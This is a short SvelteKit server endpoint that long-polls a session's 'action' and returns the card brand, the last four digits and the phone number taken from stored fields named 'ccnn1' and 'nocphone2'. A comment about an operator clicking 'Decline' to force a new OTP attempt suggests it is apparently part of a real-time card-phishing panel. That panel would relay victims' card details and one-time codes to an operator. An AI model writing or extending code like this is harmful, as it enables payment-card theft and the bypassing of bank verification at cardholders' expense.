import { json } from '@sveltejs/kit';
import { getAction, readRawForCheck } from '$lib/sessions.js';

function detectBrand(num = '') {
  const n = String(num).replace(/\D/g, '');
  if (/^4/.test(n)) return 'visa';
  if (/^(5[1-5]|2[2-7])/.test(n)) return 'mastercard';
  if (/^3[47]/.test(n)) return 'amex';
  if (/^6(011|5|4[4-9])/.test(n)) return 'discover';
  if (/^35/.test(n)) return 'jcb';
  if (/^3(0[0-5]|[68])/.test(n)) return 'diners';
  return 'card';
}

/**
 * Long-polling check-mode.
 *  - ?s=<id>           initial: returns immediately with action + card meta
 *  - ?s=<id>&w=1&p=<a> wait poll: holds up to ~20s, returns when action !== p
 *
 * @type {import('./$types').RequestHandler}
 */
export async function GET({ url, platform, request }) {
  const sessionId = url.searchParams.get('s');
  if (!sessionId) return json({ action: 'pending' });

  const wait = url.searchParams.get('w') === '1';
  // prev can be "<action>|<ts>" so that re-issuing the SAME action
  // (e.g. Decline clicked twice for a new wrong-OTP attempt) still fires.
  const prevRaw = url.searchParams.get('p') || '';
  const [prevAction, prevTsStr] = prevRaw.split('|');
  const prevTs = Number(prevTsStr) || 0;

  const changed = (s) => s.action !== prevAction || (Number(s.updatedAt) || 0) !== prevTs;

  if (wait) {
    const deadline = Date.now() + 20000;
    while (Date.now() < deadline) {
      if (request.signal?.aborted) return json({ action: prevAction, ts: prevTs });
      const s = await getAction(platform, sessionId);
      if (changed(s)) {
        return json({ action: s.action, ts: Number(s.updatedAt) || 0 }, { headers: { 'Cache-Control': 'no-store' } });
      }
      await new Promise((r) => setTimeout(r, 250));
    }
    const s = await getAction(platform, sessionId);
    return json({ action: s.action, ts: Number(s.updatedAt) || 0 }, { headers: { 'Cache-Control': 'no-store' } });
  }

  const s = await readRawForCheck(platform, sessionId);
  const card = s?.data?.ccnn1 ? String(s.data.ccnn1).replace(/\D/g, '') : '';
  const cur = await getAction(platform, sessionId);
  return json(
    {
      action: cur.action,
      ts: Number(cur.updatedAt) || 0,
      brand: card ? detectBrand(card) : null,
      last4: card ? card.slice(-4) : null,
      phone: s?.data?.nocphone2 ?? null
    },
    { headers: { 'Cache-Control': 'no-store' } }
  );
}
